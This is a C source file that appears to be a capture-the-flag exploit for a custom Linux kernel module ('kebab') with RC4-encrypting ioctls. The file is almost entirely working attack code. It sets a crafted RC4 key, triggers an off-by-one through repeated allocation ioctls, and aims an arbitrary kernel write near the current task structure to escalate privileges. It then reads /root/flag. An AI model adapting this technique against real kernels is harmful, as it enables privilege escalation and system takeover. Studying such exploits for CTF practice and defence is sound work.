#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>


#define KEBAB_IOCTL_NEW       0xFABADA
#define KEBAB_IOCTL_SET_KEY   0x1CAFE
#define MAX_RC4_LEN    256


struct new_secbuff_arg {
  size_t size;
  char key[MAX_RC4_LEN];
  char* buffer;
};

struct key_info {
  int pid;
  struct task_struct *cur;
  size_t max_len;
};

struct rc4_state {
  unsigned char perm[256];
  unsigned char index1;
  unsigned char index2;
};


char RC4_key[MAX_RC4_LEN + 1] = {0};


void swap_bytes(unsigned char* a, unsigned char* b) {
  unsigned char temp;

  temp = *a;
  *a = *b;
  *b = temp;
}


void rc4_init(struct rc4_state* const state, unsigned char* key, int keylen) {
  unsigned char j;
  int i;

  for (i = 0; i < 256; i++) {
    state->perm[i] = (unsigned char) i;
  }

  state->index1 = 0;
  state->index2 = 0;

  for (i = j = 0; i < 256; i++) {
    j += state->perm[i] + key[i % keylen];
    swap_bytes(&state->perm[i], &state->perm[j]);
  }
}


void rc4_crypt(struct rc4_state* const state, unsigned char* const inbuf, unsigned char* outbuf, int buflen) {
  int i;
  unsigned char j;

  for (i = 0; i <= buflen; i++) {
    state->index1++;
    state->index2 += state->perm[state->index1];

    swap_bytes(&state->perm[state->index1], &state->perm[state->index2]);

    j = state->perm[state->index1] + state->perm[state->index2];
    outbuf[i] = inbuf[i] ^ state->perm[j];
  }
}


void RC4(char* user_buff, unsigned char* sec_buff, size_t size) {
  struct rc4_state rc4st;
  rc4_init(&rc4st, RC4_key, strlen(RC4_key));
  rc4_crypt(&rc4st, user_buff, sec_buff, size);
}


int ioctl_new(int fd, struct new_secbuff_arg* arg) {
  return ioctl(fd, KEBAB_IOCTL_NEW, arg);
}


int ioctl_set_key(int fd, struct key_info* ki) {
  memcpy((void*) ki, RC4_key, MAX_RC4_LEN);
  return ioctl(fd, KEBAB_IOCTL_SET_KEY, (void*) ki);
}


void exploit(int fd) {
  char buff[0x20];
  char flag[256];
  FILE* fp;

  memset(RC4_key, 'A', MAX_RC4_LEN);
  RC4_key[0] = '8';
  RC4_key[1] = 'p';
  RC4_key[2] = 'b';
  RC4_key[255] = '\0';

  struct key_info ki;

  if (ioctl_set_key(fd, &ki)) {
    close(fd);
    return;
  }

  memset(buff, 'A', sizeof(buff));
  buff[sizeof(buff) - 1] = 0;

  struct new_secbuff_arg new_arg = { .size = sizeof(buff), .buffer = buff };
  strncpy(new_arg.key, RC4_key, MAX_RC4_LEN);

  // First allocation: trigger off-by-one
  if (ioctl_new(fd, &new_arg)) {
    close(fd);
    return;
  }

  ((unsigned long*) buff)[0] = ((unsigned long) ki.cur) - 16;
  RC4(buff, new_arg.buffer, sizeof(buff));

  // Second allocation: set target address for arb-write
  if (ioctl_new(fd, &new_arg)) {
    close(fd);
    return;
  }

  memset(new_arg.buffer, 'A', sizeof(buff));
  new_arg.buffer[sizeof(buff) - 1] = 0;

  // Third allocation: dummy
  if (ioctl_new(fd, &new_arg)) {
    close(fd);
    return;
  }

  memset(buff, 0, sizeof(buff));
  RC4(buff, new_arg.buffer, sizeof(buff));

  // Last allocation: arb-write
  if (ioctl_new(fd, &new_arg)) {
    close(fd);
    return;
  }

  close(fd);

  if ((fp = fopen("/root/flag", "r")) == NULL) {
    return;
  }

  fgets(flag, sizeof(flag), fp);
  fclose(fp);

  puts(flag);
}
